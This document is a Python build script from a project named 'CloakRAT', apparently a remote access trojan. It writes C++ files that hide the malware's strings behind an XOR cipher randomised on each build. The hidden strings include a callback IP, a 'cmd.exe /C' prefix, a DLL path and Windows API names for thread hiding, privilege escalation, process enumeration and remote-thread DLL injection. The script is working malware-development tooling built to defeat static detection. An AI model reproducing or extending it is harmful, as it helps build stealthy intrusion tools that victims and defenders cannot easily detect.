import secrets
import os

HEADER_NAME = 'encrypted_strings_autogen.h'
SOURCE_NAME = 'encrypted_strings_autogen.cpp'
DIR = os.path.dirname(os.path.realpath(__file__)) + '\\Shared'
KEY_ENTROPY = 16 # bytes
HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'


# Add or modify strings here.
strings_to_encrypt = {
    # CloakRAT general strings
    'str_ip': '127.0.0.1',
    'str_cmd': 'cmd.exe /C',
    'str_dllPath': 'C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Debug\\CloakRAT.dll',
    'str_socket': 'socket',
    
    # function names
    'str_NtSetInformationThread': 'NtSetInformationThread',
    'str_GetCurrentThread': 'GetCurrentThread',
    'str_Sleep': 'Sleep',
    'str_OpenProcess': 'OpenProcess',
    'str_VirtualAllocEx': 'VirtualAllocEx',
    'str_WriteProcessMemory': 'WriteProcessMemory',
    'str_LoadLibraryA': 'LoadLibraryA',
    'str_CreateRemoteThread': 'CreateRemoteThread',
    'str_CloseHandle': 'CloseHandle',
    'str_LookupPrivilegeValueA': 'LookupPrivilegeValueA',
    'str_GetLastError': 'GetLastError',
    'str_AdjustTokenPrivileges': 'AdjustTokenPrivileges',
    'str_OpenProcessToken': 'OpenProcessToken',
    'str_GetCurrentProcess': 'GetCurrentProcess',
    'str_CreateToolhelp32Snapshot': 'CreateToolhelp32Snapshot',
    'str_Process32First': 'Process32First',
    'str_Process32Next': 'Process32Next',
    'str_CreatePipe': 'CreatePipe',
    'str_SetHandleInformation': 'SetHandleInformation',
    'str_ReadFile': 'ReadFile',
    'str_CreatePipe': 'CreatePipe',
    'str_FormatMessageA': 'FormatMessageA',
    'str_LocalFree': 'LocalFree',
    'str_CreateProcessA': 'CreateProcessA',
    
    
    # DLLs
    'str_kernel32': 'kernel32.dll',
    'str_ntdll': 'ntdll.dll',
    'str_advapi32': 'advapi32.dll',
    'str_ws2_32': 'ws2_32.dll',
    'str_user32': 'user32.dll'
}

def gen_key() -> list[int]:
    key = []
    for _ in range(KEY_ENTROPY):
        key.append(secrets.randbelow(256))
    return key

def get_random_op() -> str:
    return secrets.choice(['+', '-', '*'])

def xor_encrypt(string_plaintext: str, key: list[int], cipher: str) -> list[int]:
    # The highest bit in the first byte is preserved to indicate if runtime re-encryption has happened (see runtime_reencryption())
    encrypted_bytes = [secrets.randbelow(128)] # highest possible random value is 2^7
    data = string_plaintext.encode('utf-8') + b'\x00' # add the null terminator because this we treat the string as a C-style string 

    for i, byte in enumerate(data, 1):
        encrypted_bytes.append((byte ^ eval(cipher)) & 0xFF)
    
    return encrypted_bytes
    
def to_c_struct(variable_name: str):
    #typedef struct EncryptedString {{\n    unsigned char* data;\n    size_t length;\n}} EncryptedString;\n
    return f'EncryptedString {variable_name} = {{\n    {variable_name}_data,\n    sizeof({variable_name}_data)\n}};'

def to_c_array(variable_name: str, buffer: list[int]) -> str:
    # return in the format: "unsigned char variable_name[] = { ...buffer };"
    elems = ', '.join(str(b) for b in buffer)
    return f"unsigned char {variable_name}[] = {{ {elems} }};"

def to_extern_decl(variable_name: str) -> str:
    # return in the format: "extern EncryptedString variable_name;"
    return f"extern EncryptedString {variable_name};"
    

def main():    
    key = gen_key()

    rand_op1 = get_random_op()
    rand_op2 = get_random_op()
    rand_op3 = get_random_op()
    rand_xor_value = secrets.randbelow(256)
    
    # BE CAREFUL TO EDIT VARIABLE NAMES HERE, THIS IS GOING TO BE PROCESSED BY eval()
    byte_chiper = f"((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + key[i % len(key)] & ((i//2)>>3) * i {rand_op3} key[i % len(key)]) << (i % 5)) & 0x7F ^ {rand_xor_value})" # randomize the cipher each run
    
    # Generate the Source file 
    with open(f'{DIR}/{SOURCE_NAME}', 'w') as source_file:
        source_file.write(f'#include \"{HEADER_NAME}\"\n\n')
        
        for var_name, string in strings_to_encrypt.items():
            var_name = f'{var_name}'
            encrypted_string_lst = xor_encrypt(string, key, byte_chiper)
            encrypted_c_arr = to_c_array(f'{var_name}_data', encrypted_string_lst)
            c_struct = to_c_struct(var_name)
            source_file.write(encrypted_c_arr + '\n')  # Write the encrypted string array
            source_file.write(c_struct + '\n\n')  # Write the encrypted string struct
    
    # Generate the Header file
    with open(f'{DIR}/{HEADER_NAME}', 'w') as header_file:
        c_style_byte_cipher = f"(unsigned char)((i % 4 | ((i {rand_op1} 9) {rand_op2} 2 + {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()] & ((i/2)>>3) * i {rand_op3} {HEADER_XOR_KEY_VARIABLE_NAME}[i % {HEADER_XOR_KEY_VARIABLE_NAME}.size()]) << (i % 5)) & 0x7F ^ {rand_xor_value})"
        
        header_file.write('#pragma once\n\n')
        header_file.write('#include <array>\n\n')
        header_file.write(f'#define {HEADER_XOR_CIPHER_VARIABLE_NAME} {c_style_byte_cipher}\n')
        header_file.write(f'static std::array<uint8_t, {KEY_ENTROPY}> {HEADER_XOR_KEY_VARIABLE_NAME} = {{ {', '.join(str(b) for b in key)} }};\n\n')
        header_file.write(f'typedef struct EncryptedString {{\n    unsigned char* data;\n    size_t length;\n}} EncryptedString;\n\n')
        
        for var_name in strings_to_encrypt.keys():
            extern_decl = to_extern_decl(var_name)
            header_file.write(extern_decl + '\n')

if __name__ == '__main__':
        main()
